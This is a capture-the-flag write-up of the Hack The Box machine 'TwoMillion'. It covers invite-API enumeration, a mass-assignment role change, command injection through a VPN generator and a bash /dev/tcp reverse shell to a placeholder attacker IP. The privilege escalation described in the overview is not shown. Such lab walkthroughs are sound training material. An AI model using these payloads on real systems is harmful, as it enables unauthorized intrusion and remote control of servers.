## Overview

**TwoMillion** is an Easy Linux machine focused on web application enumeration, API analysis, broken access control, command injection and Linux privilege escalation.

The target hosts a recreation of the original Hack The Box platform. The initial attack path involves analyzing the application's invite system and interacting with undocumented API endpoints. After obtaining an invite code and registering an account, further API enumeration reveals an administrative endpoint affected by **Mass Assignment**, allowing the modification of the current user's role.

Administrative access exposes a VPN generation feature vulnerable to **Command Injection**, providing an initial shell on the target. Local enumeration then reveals application credentials stored in an environment configuration file, which can be reused to access the system through SSH.

Finally, an internal Git repository exposes a vulnerability affecting the system's kernel version. The vulnerability is exploited to escalate privileges and obtain root access.

# 2. Web Enumeration

## 2.1 Initial Application Analysis

The website was a recreation of the original Hack The Box platform.

The application required an invite code before allowing users to register an account.

The available functionality included:

- Login
- Registration
- Invite code generation
- VPN access
- Connection pack generation

The invite system was analyzed using the browser developer tools and Burp Suite.

---

## 2.2 Invite API Enumeration

While inspecting the requests generated by the application, an API endpoint related to invite code generation was identified:

```text
/api/v1/invite/how/to/generate
```

A request to this endpoint returned instructions encoded using Base64.

The encoded value was decoded:

```bash
echo '<BASE64_VALUE>' | base64 -d
```

The decoded response revealed the API endpoint required to generate an invite code:

```text
/api/v1/invite/generate
```

A request was then sent to the endpoint:

```http
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
```

The response contained an encoded invite code.

The invite code was decoded:

```bash
echo '<ENCODED_INVITE_CODE>' | base64 -d
```

The resulting code was used to register a new account.

# 4. API Enumeration

The application API was enumerated to identify additional endpoints and supported HTTP methods.

An API endpoint returned information about the available routes:

```text
/api/v1
```

Further enumeration revealed administrative functionality related to user management.

One of the discovered endpoints allowed administrators to modify the role assigned to a user.

The relevant endpoint was:

```text
/api/v1/admin/settings/update
```

The endpoint accepted JSON data containing account properties.

---

# 5. Privilege Escalation - Mass Assignment

The API endpoint did not correctly enforce authorization when modifying user properties.

The current user's role could be changed by including the `is_admin` parameter in the request.

The following JSON body was submitted:

```json
{
    "is_admin": 1
}
```

The request successfully changed the current account to an administrator account.

This is an example of a **Mass Assignment** vulnerability.

The application accepted and processed a sensitive property supplied by the client without properly restricting which fields could be modified.

After refreshing the application, administrative functionality became available.

# 6. Command Injection

## 6.1 VPN Generation

Administrative access exposed functionality for generating VPN configuration files.

The application accepted a VPN server parameter.

The request was intercepted using Burp Suite and modified to test for command injection.

A payload was inserted into the request parameter:

```text
;id;
```

The response confirmed that commands were executed on the target.

This demonstrated that the application was vulnerable to **Command Injection**.

---

## 6.2 Reverse Shell

A reverse shell listener was started on the attacker machine:

```bash
nc -lvnp <LISTENER_PORT>
```

A reverse shell payload was then injected through the vulnerable VPN generation functionality:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1'
```

# 7. Initial Access

The shell was upgraded to obtain a more stable interactive session.

The shell was then stabilized using the standard terminal upgrade process.

# Key Takeaways

- Web applications may expose undocumented API endpoints through JavaScript files or client-side requests.
- Browser developer tools and Burp Suite are useful for identifying hidden application functionality.
- Encoded API responses should be decoded and analyzed during web enumeration.
- **Mass Assignment** occurs when an application accepts sensitive object properties without properly restricting client-controlled fields.
- Authorization checks must be enforced server-side.
- Administrative functionality can introduce additional attack surface.
- User-controlled input must never be passed directly to operating system commands.
- Command Injection can lead to remote code execution and initial system access.
- Environment configuration files may contain reusable credentials.
- Credentials discovered in web applications should be tested against other exposed services.
- Internal repositories and application messages may reveal information about known vulnerabilities.
- Kernel version information can help identify potential local privilege escalation vectors.
